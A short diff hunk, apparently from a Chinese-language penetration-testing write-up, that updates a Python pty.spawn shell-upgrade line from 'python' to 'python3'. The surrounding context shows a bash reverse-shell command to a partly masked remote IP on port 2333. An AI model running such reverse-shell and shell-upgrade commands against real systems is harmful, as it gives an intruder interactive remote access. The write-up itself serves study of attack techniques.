@@ -278,7 +278,7 @@ bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
 
 ## success!
 
-提升交互性：` python -c 'import pty; pty.spawn("/bin/bash")' `
+提升交互性：` python3 -c 'import pty; pty.spawn("/bin/bash")' `
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
